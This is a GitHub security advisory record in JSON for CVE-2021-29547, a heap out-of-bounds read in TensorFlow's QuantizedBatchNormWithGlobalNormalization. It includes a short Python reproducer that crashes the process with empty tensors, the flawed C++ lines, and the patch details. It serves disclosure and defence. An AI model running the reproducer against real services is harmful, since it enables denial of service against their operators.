{
    "ghsaId": "GHSA-4fg4-p75j-w5xj",
    "severity": "LOW",
    "summary": "Heap out of bounds in `QuantizedBatchNormWithGlobalNormalization`",
    "description": "### Impact\nAn attacker can cause a segfault and denial of service via accessing data outside of bounds in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)\nt_min = tf.constant([], shape=[0], dtype=tf.float32)\nt_max = tf.constant([], shape=[0], dtype=tf.float32)\nm = tf.constant([1], shape=[1], dtype=tf.quint8)\nm_min = tf.constant([], shape=[0], dtype=tf.float32)\nm_max = tf.constant([], shape=[0], dtype=tf.float32)\nv = tf.constant([1], shape=[1], dtype=tf.quint8)\nv_min = tf.constant([], shape=[0], dtype=tf.float32)\nv_max = tf.constant([], shape=[0], dtype=tf.float32)\nbeta = tf.constant([1], shape=[1], dtype=tf.quint8)\nbeta_min = tf.constant([], shape=[0], dtype=tf.float32)\nbeta_max = tf.constant([], shape=[0], dtype=tf.float32)\ngamma = tf.constant([1], shape=[1], dtype=tf.quint8)\ngamma_min = tf.constant([], shape=[0], dtype=tf.float32)\ngamma_max = tf.constant([], shape=[0], dtype=tf.float32) \n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```                         \n                            \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc#L176-L189) assumes the inputs are not empty: \n  \n```cc\nconst float input_min = context->input(1).flat<float>()(0);\nconst float input_max = context->input(2).flat<float>()(0);\n...\nconst float mean_min = context->input(4).flat<float>()(0);\nconst float mean_max = context->input(5).flat<float>()(0);\n...\nconst float var_min = context->input(7).flat<float>()(0);\nconst float var_max = context->input(8).flat<float>()(0);\n...\nconst float beta_min = context->input(10).flat<float>()(0);\nconst float beta_max = context->input(11).flat<float>()(0);\n...\nconst float gamma_min = context->input(13).flat<float>()(0);\nconst float gamma_max = context->input(14).flat<float>()(0);\n```\n\nIf any of these inputs is empty, `.flat<T>()` is an empty buffer, so accessing the element at index 0 is accessing data outside of bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
    "permalink": "https://github.com/advisories/GHSA-4fg4-p75j-w5xj",
    "publishedAt": "2021-05-21T14:23:31Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-4fg4-p75j-w5xj"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29547"
        }
    ]
}